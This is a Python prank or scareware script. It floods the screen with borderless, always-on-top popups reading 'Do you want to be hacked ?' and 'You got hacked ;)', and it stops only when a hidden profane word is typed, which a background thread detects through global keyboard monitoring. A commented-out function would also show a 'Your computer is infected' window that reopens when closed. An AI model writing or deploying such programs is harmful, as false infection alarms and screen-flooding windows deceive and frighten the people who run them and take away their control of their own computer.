import os
import random
from tkinter import *
from random import randint
import time
import threading
import keyboard  # using module keyboard
import psutil
import datetime

stopped = False

def stop():
    global stopped
    stop_word = "fuck"
    typed_string = ""
    while True:  # making a loop
        time.sleep(0.1)
        try:  # used try so that if user pressed other than the given key error will not be shown
            for key in stop_word:
                if keyboard.is_pressed(key):
                    if not stop_word.startswith(typed_string):
                        typed_string = typed_string
                    typed_string += key
                    if stop_word in typed_string:
                        stopped = True
                        return
        except:
            typed_string = ""  # String composed of chracters typed by the users (only the one of the stop_word)

def create_new_window():
    window = Tk()
    window.title("Your computer is infected")
    window.geometry("400x300")
    label = Label(window, text="❌ A virus was detected on your device ❌", font=("Arial", 15), fg="red")
    label.pack()
    window.protocol("WM_DELETE_WINDOW", create_new_window)
    window.mainloop()

# create_new_window()


root = Tk()
root.attributes("-alpha", 0)
root.overrideredirect(1)
root.attributes("-topmost", 1)

now = datetime.datetime.now()

user_choice = ""

def set_user_choice(choice):
    global user_choice
    user_choice = choice
    return choice

def placewindows(seconds=9 ** 9):
    global stopped
    while datetime.datetime.now() - now < datetime.timedelta(seconds=seconds):
        if stopped:
            break
        win = Toplevel(root)
        win.geometry("300x120+" + str(randint(0, root.winfo_screenwidth() - 300)) + "+" + str(randint(0, root.winfo_screenheight() - 60)))
        win.overrideredirect(1)
        if user_choice:
            Label(win, text="You got hacked ;)", fg="#E52800", font=("Helvetica", 15)).place(relx=.25, rely=.3)
        else:
            Label(win, text="Do you want to be hacked ?", fg="#E52800", font=("Helvetica", 12)).place(relx=.15, rely=.2)
            Button(win, text="Yes", width=10, command=lambda: set_user_choice("Yes"), default=ACTIVE).place(relx=.58, rely=.5)
            Button(win, text="No", width=10, command=lambda: set_user_choice("No")).place(relx=.2, rely=.5)
        win.lift()
        win.attributes("-topmost", True)
        win.attributes("-topmost", False)
        root.lift()
        root.attributes("-topmost", True)
        root.attributes("-topmost", False)
        time.sleep(.05)
    current_system_pid = os.getpid()
    ThisSystem = psutil.Process(current_system_pid)
    ThisSystem.terminate()

threading.Thread(target=placewindows).start()
threading.Thread(target=stop).start()

root.mainloop()
